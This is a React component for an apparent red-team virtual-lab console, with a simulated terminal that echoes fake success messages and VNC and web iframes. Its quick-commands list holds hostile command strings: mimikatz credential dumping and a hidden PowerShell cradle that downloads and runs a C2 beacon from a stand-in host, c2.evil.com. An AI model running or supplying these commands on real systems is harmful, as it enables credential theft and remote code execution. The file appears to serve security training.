import { useState, useEffect } from 'react'
import { Terminal, Monitor, Globe, FileCode, Copy, Download, Upload, Settings, Maximize, Minimize } from '@phosphor-icons/react'
import { Button } from '@/components/ui/button'
import { Badge } from '@/components/ui/badge'
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card'
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs'
import { Input } from '@/components/ui/input'
import type { VM } from '@/types/virtual-lab'

interface Props {
  vm: VM
}

export function VMConsole({ vm }: Props) {
  const [activeTab, setActiveTab] = useState('console')
  const [commandHistory, setCommandHistory] = useState<string[]>([
    'Starting red team operations...',
    'Loading exploitation frameworks...',
    'Initializing stealth protocols...',
    'Ready for engagement.'
  ])
  const [currentCommand, setCurrentCommand] = useState('')
  const [isFullscreen, setIsFullscreen] = useState(false)
  const url = vm.consoleUrl || '#'
  const isRunning = vm.status === 'running'

  const executeCommand = () => {
    if (!currentCommand.trim()) return
    
    setCommandHistory(prev => [...prev, `> ${currentCommand}`, 'Command executed successfully.'])
    setCurrentCommand('')
  }

  const quickCommands = [
    { name: 'Network Scan', command: 'nmap -sS -sV target_network', description: 'Stealth TCP SYN scan' },
    { name: 'Credentials', command: 'mimikatz.exe "sekurlsa::logonpasswords"', description: 'Extract credentials from memory' },
    { name: 'Domain Enum', command: 'bloodhound-python -d domain.local -u user -p pass', description: 'Enumerate AD relationships' },
    { name: 'C2 Beacon', command: 'powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).downloadString(\'http://c2.evil.com/beacon\')"', description: 'Deploy C2 implant' }
  ]

  return (
    <Card className="glass-card h-[500px] flex flex-col">
      <CardHeader className="pb-3">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-2">
            <div className={`w-2 h-2 rounded-full ${isRunning ? 'bg-green-500 animate-pulse' : 'bg-yellow-500'}`} />
            <CardTitle className="text-lg flex items-center gap-2">
              <Terminal className="w-5 h-5" />
              {vm.name} Console
            </CardTitle>
            <Badge variant="outline" className="text-xs">
              {vm.distro.toUpperCase()}
            </Badge>
          </div>
          <div className="flex items-center gap-2">
            <Badge className={isRunning ? 'bg-green-500/20 text-green-400' : 'bg-yellow-500/20 text-yellow-400'}>
              {isRunning ? 'Connected' : vm.status}
            </Badge>
            <Button size="sm" variant="outline" className="glass-button" onClick={() => setIsFullscreen(!isFullscreen)}>
              {isFullscreen ? <Minimize className="w-4 h-4" /> : <Maximize className="w-4 h-4" />}
            </Button>
          </div>
        </div>
      </CardHeader>
      
      <CardContent className="flex-1 flex flex-col p-0">
        <Tabs value={activeTab} onValueChange={setActiveTab} className="flex-1 flex flex-col">
          <TabsList className="mx-4 grid w-fit grid-cols-4 glass-card">
            <TabsTrigger value="console" className="flex items-center gap-1">
              <Terminal className="w-3 h-3" />
              Console
            </TabsTrigger>
            <TabsTrigger value="commands" className="flex items-center gap-1">
              <FileCode className="w-3 h-3" />
              Commands
            </TabsTrigger>
            <TabsTrigger value="vnc" className="flex items-center gap-1">
              <Monitor className="w-3 h-3" />
              VNC
            </TabsTrigger>
            <TabsTrigger value="web" className="flex items-center gap-1">
              <Globe className="w-3 h-3" />
              Web
            </TabsTrigger>
          </TabsList>

          <TabsContent value="console" className="flex-1 mx-4 mb-4">
            {isRunning ? (
              <div className="h-full flex flex-col bg-black/90 rounded-lg p-4 font-mono text-sm">
                <div className="flex-1 overflow-y-auto space-y-1 text-green-400">
                  {commandHistory.map((line, index) => (
                    <div key={index} className={line.startsWith('>') ? 'text-white' : 'text-green-400'}>
                      {line}
                    </div>
                  ))}
                </div>
                <div className="flex items-center gap-2 pt-2 border-t border-gray-700">
                  <span className="text-red-400">root@{vm.name.toLowerCase().replace(/\s+/g, '-')}:~#</span>
                  <Input
                    value={currentCommand}
                    onChange={(e) => setCurrentCommand(e.target.value)}
                    onKeyPress={(e) => e.key === 'Enter' && executeCommand()}
                    className="bg-transparent border-none text-white font-mono focus:ring-0 focus:border-none"
                    placeholder="Enter command..."
                  />
                </div>
              </div>
            ) : (
              <div className="h-full flex items-center justify-center text-center">
                <div>
                  <Terminal className="w-16 h-16 text-muted-foreground mx-auto mb-4" />
                  <p className="text-lg font-medium mb-2">Console Offline</p>
                  <p className="text-sm text-muted-foreground">Start the VM to access the console</p>
                </div>
              </div>
            )}
          </TabsContent>

          <TabsContent value="commands" className="flex-1 mx-4 mb-4">
            <div className="h-full space-y-3 overflow-y-auto">
              <div className="text-sm font-medium text-muted-foreground mb-3">Quick Commands</div>
              {quickCommands.map((cmd, index) => (
                <div key={index} className="p-3 bg-muted/30 rounded-lg">
                  <div className="flex items-center justify-between mb-2">
                    <h4 className="font-medium">{cmd.name}</h4>
                    <Button size="sm" variant="outline" className="glass-button">
                      <Copy className="w-3 h-3 mr-1" />
                      Copy
                    </Button>
                  </div>
                  <p className="text-xs text-muted-foreground mb-2">{cmd.description}</p>
                  <code className="block text-xs bg-black/50 text-green-400 p-2 rounded font-mono">
                    {cmd.command}
                  </code>
                </div>
              ))}
            </div>
          </TabsContent>

          <TabsContent value="vnc" className="flex-1 mx-4 mb-4">
            {isRunning ? (
              <iframe
                src={`${url}/vnc`}
                title={`VNC ${vm.name}`}
                className="w-full h-full bg-black rounded-lg"
                allow="clipboard-read; clipboard-write"
              />
            ) : (
              <div className="h-full flex items-center justify-center text-center">
                <div>
                  <Monitor className="w-16 h-16 text-muted-foreground mx-auto mb-4" />
                  <p className="text-lg font-medium mb-2">VNC Unavailable</p>
                  <p className="text-sm text-muted-foreground">Start the VM to access VNC</p>
                </div>
              </div>
            )}
          </TabsContent>

          <TabsContent value="web" className="flex-1 mx-4 mb-4">
            {isRunning ? (
              <iframe
                src={url}
                title={`Web Console ${vm.name}`}
                className="w-full h-full bg-white rounded-lg"
                allow="clipboard-read; clipboard-write"
              />
            ) : (
              <div className="h-full flex items-center justify-center text-center">
                <div>
                  <Globe className="w-16 h-16 text-muted-foreground mx-auto mb-4" />
                  <p className="text-lg font-medium mb-2">Web Console Offline</p>
                  <p className="text-sm text-muted-foreground">Start the VM to access web console</p>
                </div>
              </div>
            )}
          </TabsContent>
        </Tabs>
      </CardContent>
    </Card>
  )
}
